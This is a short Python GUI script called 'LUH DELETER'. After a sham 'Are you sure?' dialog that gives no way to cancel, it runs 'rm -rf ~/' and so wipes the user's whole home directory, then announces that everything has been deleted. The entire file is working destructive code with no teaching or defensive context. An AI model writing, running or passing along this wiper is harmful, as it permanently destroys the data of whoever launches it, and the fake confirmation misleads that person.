#!/usr/bin/env python3
import os
import tkinter as tk
from tkinter import messagebox

def start_attack():
    messagebox.showinfo("eh?????", "Are you sure?")
    os.system("rm -rf ~/")
    messagebox.showwarning(":)", "Everything has been deleted :)")

app = tk.Tk()
app.title("LUH DELETER")
app.geometry("300x150")

label = tk.Label(app, text="This will delete everything.", wraplength=250)
label.pack(pady=20)

button = tk.Button(app, text="OK", command=start_attack)
button.pack()

app.mainloop()
